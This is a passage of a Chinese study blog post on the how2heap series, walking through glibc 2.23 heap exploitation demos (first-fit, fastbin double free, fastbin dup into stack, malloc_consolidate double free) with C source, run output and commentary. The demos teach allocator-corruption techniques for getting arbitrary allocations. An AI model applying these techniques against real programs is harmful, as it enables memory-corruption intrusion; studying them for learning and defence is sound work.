toc-level-3"><a class="toc-link" href="#house-of-einherjar-off-by-null-1"><span class="toc-number">1.3.13.</span> <span class="toc-text">house_of_einherjar(off-by-null)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-force-top-chunk-1"><span class="toc-number">1.3.14.</span> <span class="toc-text">house_of_force(top chunk)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-lore-small-bin-1"><span class="toc-number">1.3.15.</span> <span class="toc-text">house_of_lore(small bin)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-mind-fastbin-arena"><span class="toc-number">1.3.16.</span> <span class="toc-text">house_of_mind_fastbin(arena)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack-1"><span class="toc-number">1.3.17.</span> <span class="toc-text">unsorted_bin_attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#large-bin-attack"><span class="toc-number">1.3.18.</span> <span class="toc-text">large_bin_attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-storm-largebin-unsortedbin"><span class="toc-number">1.3.19.</span> <span class="toc-text">house_of_storm(largebin + unsortedbin)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-31"><span class="toc-number">1.4.</span> <span class="toc-text">2.31</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup%EF%BC%88double-free"><span class="toc-number">1.4.1.</span> <span class="toc-text">fastbin_dup（double free)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-dup-into-stack-%E5%88%86%E9%85%8D%E5%88%B0%E6%A0%88%E4%B8%8A-1"><span class="toc-number">1.4.2.</span> <span class="toc-text">fastbin_dup_into_stack(分配到栈上)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-reverse-into-tcache-1"><span class="toc-number">1.4.3.</span> <span class="toc-text">fastbin_reverse_into_tcache</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        how2heap系列学习(持续更新)
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
        <span itemprop="name">z1r0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-03-12T07:06:25.000Z" itemprop="datePublished">2022-03-12</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/study/">study</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <font size="4">

<blockquote>
<p>how2heap学习篇。<a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">https://github.com/shellphish/how2heap</a></p>
<p>之前写过glibc2.23的源码分析，这里可以照着源码来看。 2.27的话就是加了一个tcache这个东西，之后的版本也差不了太多，但是2.34把malloc_hook这些给删除了</p>
<p>这里争对的是linux，win下的堆分配不一样。</p>
</blockquote>
<h1 id="how2heap"><a href="#how2heap" class="headerlink" title="how2heap"></a>how2heap</h1><h2 id="first-fit-c"><a href="#first-fit-c" class="headerlink" title="first_fit.c"></a>first_fit.c</h2><blockquote>
<p>这就是告诉了我们glibc使用了first_fit这个算法来分配空闲堆块，分配时存在一个大小满足的空闲chunk，就会优先选择使用此chunk。</p>
</blockquote>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"glibc uses a first-fit algorithm to select a free chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If a chunk is free and large enough, malloc will select this chunk.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This can be exploited in a use-after-free situation.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 2 buffers. They can be large, don't have to be fastbin.\n"</span>);</span><br><span class="line">	<span class="type">char</span>* a = <span class="built_in">malloc</span>(<span class="number">0x512</span>);</span><br><span class="line">	<span class="type">char</span>* b = <span class="built_in">malloc</span>(<span class="number">0x256</span>);</span><br><span class="line">	<span class="type">char</span>* c;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(0x512): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(0x256): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"we could continue mallocing here...\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"now let's put a string at a that we can read later \"this is A!\"\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(a, <span class="string">"this is A!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n"</span>, a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, let's allocate 0x500 bytes\n"</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(0x500): %p\n"</span>, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And put a different string here, \"this is C!\"\n"</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(c, <span class="string">"this is C!"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd allocation %p points to %s\n"</span>, c, c);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"first allocation %p points to %s\n"</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we reuse the first allocation, it now holds the data from the third allocation.\n"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>运行结果如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.</span><br><span class="line">glibc uses a first-fit algorithm to select a free chunk.</span><br><span class="line">If a chunk is free and large enough, malloc will select this chunk.</span><br><span class="line">This can be exploited in a use-after-free situation.</span><br><span class="line">Allocating 2 buffers. They can be large, don't have to be fastbin.</span><br><span class="line">1st malloc(0x512): 0x5555555592a0</span><br><span class="line">2nd malloc(0x256): 0x5555555597c0</span><br><span class="line">we could continue mallocing here...</span><br><span class="line">now let's put a string at a that we can read later "this is A!"</span><br><span class="line">first allocation 0x5555555592a0 points to this is A!</span><br><span class="line">Freeing the first one...</span><br><span class="line">We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at 0x5555555592a0</span><br><span class="line">So, let's allocate 0x500 bytes</span><br><span class="line">3rd malloc(0x500): 0x5555555592a0</span><br><span class="line">And put a different string here, "this is C!"</span><br><span class="line">3rd allocation 0x5555555592a0 points to this is C!</span><br><span class="line">first allocation 0x5555555592a0 points to this is C!</span><br><span class="line">If we reuse the first allocation, it now holds the data from the third allocation.</span><br></pre></td></tr></tbody></table></figure>

<h2 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc_2.23"></a>glibc_2.23</h2><blockquote>
<p>笔者写了2.23下的源码分析，用how2heap来实践学习一下</p>
</blockquote>
<h3 id="fastbin-dup-double-free"><a href="#fastbin-dup-double-free" class="headerlink" title="fastbin_dup(double free)"></a>fastbin_dup(double free)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">	a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	assert(a == c);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这里其实就是实现了一个double free的功能，最后malloc时会有两个堆块共用一个内存</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/1.png"></p>
<p>执行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x55555555b010</span><br><span class="line">2nd malloc(8): 0x55555555b030</span><br><span class="line">3rd malloc(8): 0x55555555b050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x55555555b010 again, things will crash because 0x55555555b010 is at the top of the free list.</span><br><span class="line">So, instead, we'll free 0x55555555b030.</span><br><span class="line">Now, we can free 0x55555555b010 again, since it's not the head of the free list.</span><br><span class="line">Now the free list has [ 0x55555555b010, 0x55555555b030, 0x55555555b010 ]. If we malloc 3 times, we'll get 0x55555555b010 twice!</span><br><span class="line">1st malloc(8): 0x55555555b010</span><br><span class="line">2nd malloc(8): 0x55555555b030</span><br><span class="line">3rd malloc(8): 0x55555555b010</span><br></pre></td></tr></tbody></table></figure>

<h3 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span></span><br><span class="line">	       <span class="string">"returning a pointer to a controlled location (in this case, the stack).\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want malloc() to return is %p.\n"</span>, <span class="number">8</span>+(<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="type">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="type">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. "</span></span><br><span class="line">		<span class="string">"We'll now carry out our attack by modifying data at %p.\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, d);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p ].\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we have access to %p while it remains at the head of the free list.\n"</span></span><br><span class="line">		<span class="string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span></span><br><span class="line">		<span class="string">"so that malloc will think there is a free chunk there and agree to\n"</span></span><br><span class="line">		<span class="string">"return a pointer to it.\n"</span>, a);</span><br><span class="line">	stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span>, a);</span><br><span class="line">	*d = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>) (((<span class="type">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4th malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这种攻击方式也是在堆中非常常见的，先进行double free接着改fd为目标地址，再申请过去就可以实现申请任意地址，这里还有一个非常重要的信息，需要伪造size。为什么要伪造size可以照着看2.23的源码。这里给的代码是申请地址到stack上</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/2.png"></p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7fffffffdd20.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x55555555b010</span><br><span class="line">2nd malloc(8): 0x55555555b030</span><br><span class="line">3rd malloc(8): 0x55555555b050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x55555555b010 again, things will crash because 0x55555555b010 is at the top of the free list.</span><br><span class="line">So, instead, we'll free 0x55555555b030.</span><br><span class="line">Now, we can free 0x55555555b010 again, since it's not the head of the free list.</span><br><span class="line">Now the free list has [ 0x55555555b010, 0x55555555b030, 0x55555555b010 ]. We'll now carry out our attack by modifying data at 0x55555555b010.</span><br><span class="line">1st malloc(8): 0x55555555b010</span><br><span class="line">2nd malloc(8): 0x55555555b030</span><br><span class="line">Now the free list has [ 0x55555555b010 ].</span><br><span class="line">Now, we have access to 0x55555555b010 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x55555555b010 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x55555555b010, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7fffffffdd20</span><br></pre></td></tr></tbody></table></figure>

<h3 id="fastbin-dup-consolidate-double-free-malloc-consolidate"><a href="#fastbin-dup-consolidate-double-free-malloc-consolidate" class="headerlink" title="fastbin_dup_consolidate(double free-malloc_consolidate)"></a>fastbin_dup_consolidate(double free-malloc_consolidate)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line">  <span class="type">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="type">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated two fastbins: p1=%p p2=%p\n"</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now free p1!\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocated large bin to trigger malloc_consolidate(): p3=%p\n"</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In malloc_consolidate(), p1 is moved to the unsorted bin.\n"</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Trigger the double free vulnerability!\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We can pass the check in malloc() since p1 is not fast top.\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>这里其实就是用的large bin中malloc_consolidate这个来进行double free。13行下个断点之后，p1被释放掉并放进了small bin中</p>
<p><img src="/2022/03/12/how2heap%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/glibc_2.23/3.png"></p>
<p>接下来的free(p1)还是正常的进fastbin，此时p1被释放了两次，再次申请两次时会用同一个地址。看过2.23下的源码就可以发现fastbin不可以直接free(p1) free(p1)因为会检测第一个与第二个是否一样，但这里第一次将p1放入到了smallbins中所以第二次free的时候没有影响。</p>
<p>运行结果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocated two fastbins: p1=0x55555555b010 p2=0x55555555b060</span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3=0x55555555b0b0</span><br><span class="line">In malloc_consolidate(), p1 is moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can pass the check in malloc() since p1 is not fast top.</span><br><span class="line">Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x55555555b010 0x55555555b010</span><br></pre></td></tr></tbody></table></figure>

<p>unsafe_unlink(unlink)</p>
<blockquote>
<p>利用unlink attack实现任意地址读/写</p>
</blockquote>
